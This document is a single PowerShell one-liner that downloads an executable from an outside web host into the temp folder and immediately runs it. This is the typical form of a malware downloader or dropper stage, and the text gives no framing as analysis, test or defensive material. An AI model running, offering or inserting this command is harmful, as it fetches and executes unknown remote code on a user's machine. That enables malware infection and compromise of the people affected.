($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.amspeconline.com/123/nach.exe', $dpl);Start-Process $dpl
